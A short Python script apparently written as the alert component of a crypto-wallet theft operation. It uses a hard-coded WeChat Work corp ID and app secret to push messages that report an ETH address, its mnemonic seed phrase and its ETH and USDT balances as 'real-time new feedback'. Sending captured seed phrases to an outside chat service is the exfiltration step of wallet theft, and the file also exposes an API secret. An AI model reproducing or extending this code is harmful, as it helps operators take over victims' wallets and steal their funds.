
import requests
import json

corpid = 'wwce1dba62063e9a03'
appsecret = '4gpdmqY9BI43wDvH1QutH4UfuNkkV4jQKHI2xT6WFx8'
agentid = 1000002


def send_message(**kwargs):
        # 获取accesstoken
        token_url = 'https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=' + corpid + '&corpsecret=' + appsecret
        req = requests.get(token_url)
        accesstoken = req.json()['access_token']

        # 发送消息
        msgsend_url = 'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=' + accesstoken

        params = {
                "touser": kwargs['Touser'],
                "msgtype": "markdown",
                "agentid": agentid,
                "markdown": {
                        "content": '''实时新增反馈<font color=\"warning\">请注意。</font>\n
                                    >ETH地址:<font color=\"comment\">%s</font>
                                    >助记词:<font color=\"comment\">%s</font>
                                    >ETH余额:<font color=\"comment\">%s</font>，USDT余额:<font color=\"comment\">%s</font>''' % (kwargs['addr'], kwargs['words'], kwargs['balance'], kwargs['usdt_balance'])
                },
                "safe": 0
        }
        req = requests.post(msgsend_url, data=json.dumps(params))   # 直接推送消息